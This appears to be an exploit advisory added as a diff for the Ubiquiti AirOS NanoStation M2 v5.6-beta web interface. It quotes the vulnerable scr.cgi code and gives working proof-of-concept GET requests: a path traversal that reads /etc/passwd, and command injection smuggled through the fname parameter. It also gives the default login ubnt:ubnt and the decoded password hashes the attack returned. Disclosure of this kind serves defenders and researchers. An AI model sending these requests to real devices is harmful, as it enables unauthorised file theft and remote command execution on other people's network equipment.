@@ -1,0 +1,46 @@
+# AirOS NanoStation M2 v5.6-beta 
+# Arbitrary File Download & Remote Command Execution
+# Tested on: XM.v5.6-beta5.24359.141008.1753 - Build: 2435
+#            Linux Awesome 2.6.32.63 #1 Wed Oct 8 17:54:30 EEST 2014 mips unknown
+#
+# Date: May 30, 2016
+# Informer: Pablo Rebolini - <rebolini.pablo[x]gmail.com>
+
+# Valid credentials are required !.
+# Most of devices run default factory user/passwd combination (ubnt:ubnt)
+
+# Take a look at /usr/www/scr.cgi 
+  <?
+    include("lib/settings.inc");
+    include("lib/system.inc");
+
+    $filename = $fname + ".sh";
+    $file = $fname + $status;
+    
+    header("Content-Type: application/force-download");
+    header("Content-Disposition: attachment; filename=" + $filename);
+      
+    passthru("cat /tmp/persistent/$file");
+    exit;
+
+
+# Arbitrary File Download
+# Poc:
+  GET http://x.x.x.x/scr.cgi?fname=../../../../../etc/passwd%00&status=
+
+  Raw Response: dWJudDpWdnB2Q3doY2NGdjZROjA6MDpBZG1pbmlzdHJhdG9yOi9ldGMvcGVyc2lzdGVudDovYmluL3NoCm1jdXNlcjohVnZERThDMkVCMTowOjA6Oi9ldGMvcGVyc2lzdGVudC9tY3VzZXI6L2Jpbi9zaAo=
+  
+  Base64 Decoded: ubnt:VvpvCwhccFv6Q:0:0:Administrator:/etc/persistent:/bin/sh
+                  mcuser:!VvDE8C2EB1:0:0::/etc/persistent/mcuser:/bin/sh
+
+
+# Remote Command Execution:
+# Poc:
+
+  GET http://x.x.x.x/scr.cgi?fname=rc.poststart.sh;cat%20/etc/hosts%00&status=
+
+  Raw Response: MTI3LjAuMC4xCWxvY2FsaG9zdC5sb2NhbGRvbWFpbglsb2NhbGhvc3QK
+  
+  Base64 Decoded: 127.0.0.1	localhost.localdomain	localhost
+
+  
